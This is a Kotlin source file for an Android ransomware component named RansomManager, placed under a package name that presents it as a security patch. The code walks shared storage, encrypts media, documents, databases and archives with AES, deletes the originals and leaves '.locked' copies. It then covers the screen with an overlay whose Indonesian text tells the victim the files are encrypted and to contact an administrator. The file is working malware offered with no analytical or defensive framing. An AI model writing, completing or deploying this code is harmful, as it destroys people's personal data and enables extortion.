package com.android.security.patch

import android.content.Context
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.ScrollView
import android.widget.TextView
import java.io.File
import java.security.MessageDigest
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.SecretKeyFactory
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.PBEKeySpec
import javax.crypto.spec.SecretKeySpec

object RansomManager {

    private val EXT = setOf(
        "jpg", "jpeg", "png", "gif", "webp", "bmp",
        "mp4", "mov", "avi", "mkv", "3gp",
        "mp3", "wav", "m4a", "ogg", "opus", "aac",
        "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx",
        "txt", "rtf", "csv",
        "zip", "rar", "7z", "tar", "gz",
        "sqlite", "db", "vcf", "apk", "epub"
    )

    private const val MAGIC = "RNSM"
    private const val SALT = "r4ns0m-s4lt-v1"
    private const val ITER = 40_000

    private var wm: WindowManager? = null
    private var overlay: View? = null

    // ---- key derivation ----

    private fun deriveKey(pass: String): SecretKeySpec {
        val spec = PBEKeySpec(pass.toCharArray(), SALT.toByteArray(), ITER, 256)
        val f = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256")
        return SecretKeySpec(f.generateSecret(spec).encoded, "AES")
    }

    fun setKey(ctx: Context, pass: String) {
        val hash = MessageDigest.getInstance("SHA-256")
            .digest((SALT + pass).toByteArray())
            .joinToString("") { "%02x".format(it) }
        Prefs.setStr(ctx, Prefs.RANSOM_KEY, hash)
    }

    fun verifyKey(ctx: Context, pass: String): Boolean {
        val stored = Prefs.getStr(ctx, Prefs.RANSOM_KEY) ?: return false
        val hash = MessageDigest.getInstance("SHA-256")
            .digest((SALT + pass).toByteArray())
            .joinToString("") { "%02x".format(it) }
        return stored == hash
    }

    // ---- overlay ----

    fun showOverlay(ctx: Context, msg: String) {
        if (!Settings.canDrawOverlays(ctx)) return
        detach()
        try {
            wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val sv = ScrollView(ctx)
            val tv = TextView(ctx).apply {
                setBackgroundColor(Color.parseColor("#0a0a0a"))
                setTextColor(Color.parseColor("#ff2020"))
                textSize = 18f
                setPadding(60, 80, 60, 60)
                gravity = Gravity.CENTER
                text = msg
            }
            sv.addView(tv)
            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else WindowManager.LayoutParams.TYPE_PHONE
            val lp = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                    or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                    or WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                PixelFormat.OPAQUE
            )
            wm?.addView(sv, lp)
            overlay = sv
        } catch (_: Throwable) {}
    }

    fun ensureOverlay(ctx: Context) {
        if (overlay == null) {
            val msg = Prefs.getStr(ctx, "ransom_msg") ?: defaultMsg()
            showOverlay(ctx, msg)
        }
    }

    fun hideOverlay() = detach()

    private fun detach() {
        try { overlay?.let { wm?.removeView(it) } } catch (_: Throwable) {}
        overlay = null
    }

    private fun defaultMsg(): String =
        "⚠ SEMUA FILE ANDA TELAH TERENKRIPSI ⚠\n\n" +
        "Hubungi administrator untuk membuka.\n" +
        "Jangan restart atau copot baterai."

    fun setMessage(ctx: Context, msg: String) {
        Prefs.setStr(ctx, "ransom_msg", msg)
        if (Prefs.getBool(ctx, Prefs.RANSOM_ACTIVE)) showOverlay(ctx, msg)
    }

    // ---- encrypt / decrypt ----

    fun encryptAll(ctx: Context, pass: String, onDone: (Int) -> Unit) {
        Prefs.setBool(ctx, Prefs.RANSOM_ACTIVE, true)
        Thread {
            val key = deriveKey(pass)
            var count = 0
            val roots = listOf(
                File("/sdcard"),
                File("/storage/emulated/0"),
                File("/sdcard/DCIM"),
                File("/sdcard/Pictures"),
                File("/sdcard/Download"),
                File("/sdcard/Documents"),
                File("/sdcard/Movies"),
                File("/sdcard/Music")
            ).distinctBy { it.absolutePath }

            for (root in roots) {
                if (!root.exists() || !root.canRead()) continue
                count += walk(root, key, encrypt = true)
            }
            val final = count
            Handler(Looper.getMainLooper()).post { onDone(final) }
        }.start()
    }

    fun decryptAll(ctx: Context, pass: String, onDone: (Int) -> Unit) {
        Thread {
            val key = deriveKey(pass)
            var count = 0
            val roots = listOf(
                File("/sdcard"), File("/storage/emulated/0")
            ).distinctBy { it.absolutePath }
            for (root in roots) {
                if (!root.exists() || !root.canRead()) continue
                count += walk(root, key, encrypt = false)
            }
            Prefs.setBool(ctx, Prefs.RANSOM_ACTIVE, false)
            hideOverlay()
            val final = count
            Handler(Looper.getMainLooper()).post { onDone(final) }
        }.start()
    }

    private fun walk(dir: File, key: SecretKeySpec, encrypt: Boolean): Int {
        var n = 0
        val list = dir.listFiles() ?: return 0
        for (f in list) {
            try {
                if (f.isDirectory) {
                    val name = f.name.lowercase()
                    if (name == "android" || name == "obb") continue
                    n += walk(f, key, encrypt)
                } else if (f.isFile) {
                    val name = f.name
                    if (encrypt) {
                        if (name.endsWith(".locked")) continue
                        val ext = name.substringAfterLast('.', "").lowercase()
                        if (ext !in EXT) continue
                        if (encryptFile(f, key)) n++
                    } else {
                        if (!name.endsWith(".locked")) continue
                        if (decryptFile(f, key)) n++
                    }
                }
            } catch (_: Throwable) {}
        }
        return n
    }

    private fun encryptFile(f: File, key: SecretKeySpec): Boolean {
        return try {
            val iv = ByteArray(16).also { SecureRandom().nextBytes(it) }
            val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
            cipher.init(Cipher.ENCRYPT_MODE, key, IvParameterSpec(iv))
            val plain = f.readBytes()
            val enc = cipher.doFinal(plain)
            val out = File(f.parentFile, f.name + ".locked")
            out.outputStream().use { os ->
                os.write(MAGIC.toByteArray())
                os.write(iv)
                os.write(enc)
            }
            f.delete()
            true
        } catch (_: Throwable) { false }
    }

    private fun decryptFile(f: File, key: SecretKeySpec): Boolean {
        return try {
            val data = f.readBytes()
            if (data.size < 20) return false
            val magic = String(data, 0, 4)
            if (magic != MAGIC) return false
            val iv = data.copyOfRange(4, 20)
            val enc = data.copyOfRange(20, data.size)
            val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
            cipher.init(Cipher.DECRYPT_MODE, key, IvParameterSpec(iv))
            val dec = cipher.doFinal(enc)
            val orig = f.absolutePath.removeSuffix(".locked")
            File(orig).writeBytes(dec)
            f.delete()
            true
        } catch (_: Throwable) { false }
    }
}